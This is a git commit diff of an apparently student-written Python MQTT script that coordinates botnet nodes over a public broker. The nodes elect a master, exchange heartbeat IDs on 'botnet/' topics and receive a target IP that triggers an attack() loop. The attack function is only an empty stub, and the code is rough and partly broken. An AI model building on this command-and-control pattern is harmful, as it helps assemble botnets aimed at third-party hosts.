92cfbd0d682ace0f53cbbd1f162630045e0121c4
? <alberto.garcia.2016@upb.edu.co>
2019-05-12 19:27:03 -0500

    Update PublisherSubscriber.py

--- MqttPython/Mqtt/PublisherSubscriber/PublisherSubscriber.py
+++ MqttPython/Mqtt/PublisherSubscriber/PublisherSubscriber.py
@@ -2,31 +2,41 @@ import paho.mqtt.client as mqtt
 import time
 broker = "iot.eclipse.org"
 port = 1883
-received
-nodeId
-lastId
+global received,nodeId,lastId,target
+target=0
 received=-1
 lastId=-555
 nodeId=-1
 
 def heartbeat():
-    return target,lastId
+    global target
+    global lastId
+    return str(target)+" "+str(lastId)
 
 def slave():
+    global client
+    global nodeId
     def on_connect(client, userdata, flags, rc):
         print("Connected with result code "+str(rc))
         client.subscribe("botnet/heartbeat")
 
+    client.on_connect = on_connect
+    client.on_message = on_message
+    client.on_publish = on_publish
+    client.connect(broker,port)
     
     startTime=time.time()
+    time.sleep(1)
     while(nodeId==0):
         client.loop(.1)
         if(int((time.time()-startTime)%60%2)==0):
             startTime=time.time()
-            if (!isReceived):
+            if (not isReceived()):
                 master()
 def master():
     global client
+    global nodeId
+    global lastId
     def on_connect(client, userdata, flags, rc):
         print("Connected with result code "+str(rc))
         client.subscribe("botnet/target")
@@ -37,7 +47,7 @@ def master():
         print(msg.topic+" "+str(msg.payload))
         print(" ")
         received=1
-        if(msg.topic=="botnet/lastId" and lastId<int(msg.payload)):
+        if(msg.topic=="botnet/lastId" and lastId!=int(msg.payload)):
             lastId=int(msg.payload)
             print("New local last id:",lastId)
         if(msg.topic=="botnet/target"):
@@ -60,26 +70,33 @@ def master():
     startTime=time.time()
     while(nodeId==0):
         client.loop(.1)
-        if(int((time.time()-startTime)%60%2)==0):
+        if(int((time.time()-startTime)%60%1)==0):
             startTime=time.time()
-            ret= client.publish("botnet/heartbeatId",heartbeat())
+            time.sleep(1)
+            ret= client.publish("botnet/heartbeat",heartbeat())
+            
             print("Last id:",lastId)
             print(ret)
-
-
+            
 def isSlave():
     return nodeId==1
 def isReceived():
     return received==1
-def attack(target):
+def attack():
+    global target
     startTime=time.time()
     while(True):
         ##get
         client.loop(.1)
         if(int((time.time()-startTime)%60)==0):
+            print("Checking")
+            if(target=="0"):
+                break
+                return
             startTime=time.time()
         #delay 
 def common():
+    global client
     def setNodeId(newLastId):
         global nodeId
         nodeId=newLastId
@@ -91,26 +108,41 @@ def common():
     def on_message(client, userdata, msg):
         global received
         global lastId
-        print(msg.topic+" "+str(msg.payload))
-        print(" ")
+        global target
         received=1
-        if(msg.topic=="botnet/heartbeat" and lastId<int(msg.payload[1])):
-            lastId=int(msg.payload)
+        inp=str(msg.payload)[2:-1].split(" ")
+        #print("Message",inp)
+        topic=msg.topic
+        print(topic+" "+inp)
+        print(" ")
+        
+        print(topic,"topico")
+        print("laz",lastId,"int(inp[1])",int(inp[1]))
+        if(topic=="botnet/heartbeat" and lastId!=int(inp[1])):
+            print("lasaidi",inp[1])
+            lastId=int(inp[1])
             print("New local last id:",lastId)
-        if(msg.topic=="botnet/heartbeat" and msg.payload[0]!="0"): ##Regex for catching ip
-           target= msg.payload[0]
-           attack(target)
+        if(msg.topic=="botnet/heartbeat" and inp[0]!="0"): ##Regex for catching ip
+           target= inp[0]
+           attack()
+    client.on_connect = on_connect
+    client.on_message = on_message
+    client.on_publish = on_publish
+    client.connect(broker,port)
+    
     startTime=time.time()
+    time.sleep(1)
     while(True):
         client.loop(.1)
         #print("Mi id",nodeId)
         if(int((time.time()-startTime)%60%14)==0):
             time.sleep(1)## 15 seconds elapsed
             #print("15 seconds elapsed")
-            startTime=time.time()
+            
             if(nodeId==-1 and isReceived()):   
                 setNodeId(lastId+1)
-            if(!isReceived()):
+            if(not isReceived()):
+                print("isre",isReceived())
                 print("No alive nodes, i'll be the master one")
                 master()
                 #client.loop_stop()
@@ -118,12 +150,8 @@ def common():
             else:
                 received=0
     
-    sub a heart
-    pub de id
-    while atacking revisa cada minuto x interrupción
-
-    if(isSlave() and !isReceived()):
-        
+    if(isSlave() and not isReceived()):
+        master()
 def on_publish(client,userdata,result): 
     print("data published \n")
     pass
